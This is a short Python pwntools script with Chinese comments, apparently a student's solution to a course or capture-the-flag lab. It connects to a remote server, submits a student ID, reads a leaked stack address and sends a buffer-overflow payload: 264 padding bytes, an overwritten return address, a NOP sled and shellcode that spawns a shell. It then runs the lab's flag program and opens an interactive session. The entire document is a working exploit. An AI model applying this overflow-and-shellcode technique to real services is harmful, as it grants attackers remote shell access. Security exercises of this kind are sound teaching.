from pwn import *
context.arch = 'amd64'
# context.log_level = 'debug' 
sh = remote('47.99.80.189', 10011)    # pwntools通过socket连接至远端
sh.recvuntil("Please input your StudentID:\n") # 远程环境统一要求输入学号    
sh.sendline('3180105507')
sh.recvuntil("[*] Please input your ID:\n")
sh.sendline('3180105507')

# 生成44个字节的shellcode
shellcode=asm(shellcraft.sh())

# 通过缓冲区溢出覆盖程序的局部变量，执行 shellcode
sh.recvuntil("Your ID is stored at:0x")
buf_addr = int(sh.recvuntil("\n"), 16)
sh.recvuntil("[*] Now, give me something to overflow me!\n")
payload = b'a' * 264 + p64(buf_addr) + asm('nop') * 8 + shellcode
sh.sendline(payload)        # 发送计算的payload

sh.sendline("./flag.exe 3180105507") 
sh.interactive()    # 将代码交互转换为手工交互
